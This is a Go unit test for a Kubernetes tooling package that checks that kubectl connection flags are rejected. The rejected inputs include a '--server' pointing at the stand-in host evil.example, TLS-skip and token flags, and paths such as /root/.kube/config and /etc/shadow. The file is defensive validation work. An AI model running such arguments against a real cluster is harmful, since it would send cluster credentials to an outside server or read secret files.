// SPDX-FileCopyrightText: 2026 ООО «Облачные технологии» (Cloud.ru)
// SPDX-FileContributor: Тимур Шакирбеков
// SPDX-License-Identifier: Apache-2.0

package kubetools

import "testing"

// S1-app 2: флаги, уводящие токен кластера на другой сервер или читающие
// чужой kubeconfig, отклоняются в любом транспорте; слова после "--" —
// команда в поде, а не флаги kubectl.
func TestCheckConnectionFlags(t *testing.T) {
	for _, args := range [][]string{
		{"get", "pods", "--server=https://evil.example"},
		{"get", "pods", "-shttps://evil.example"},
		{"get", "pods", "-s", "https://evil.example"},
		{"get", "pods", "--insecure-skip-tls-verify"},
		{"get", "pods", "--client_key=/etc/key"},
		{"get", "pods", "--kubeconfig", "/root/.kube/config"},
		{"get", "pods", "--token=x"},
		// Релизный аудит, R-05: файл настроек kubectl может задать флаги
		// по умолчанию; evo запускает kubectl с KUBERC=off.
		{"get", "pods", "--kuberc=/etc/shadow"},
		{"get", "pods", "--kuberc", "/tmp/kuberc"},
	} {
		if CheckConnectionFlags(args) == nil {
			t.Errorf("%v: не отклонено", args)
		}
	}
	for _, args := range [][]string{
		{"get", "pods", "-A", "-o", "wide"},
		{"get", "pods", "-n", "kube-system", "-oyaml"},
		{"auth", "can-i", "list", "pods", "--as=system:serviceaccount:default:x"},
		{"exec", "pod-1", "--", "curl", "--server", "x"},
		{"logs", "-f", "pod-1"},
	} {
		if err := CheckConnectionFlags(args); err != nil {
			t.Errorf("%v: %v", args, err)
		}
	}
}
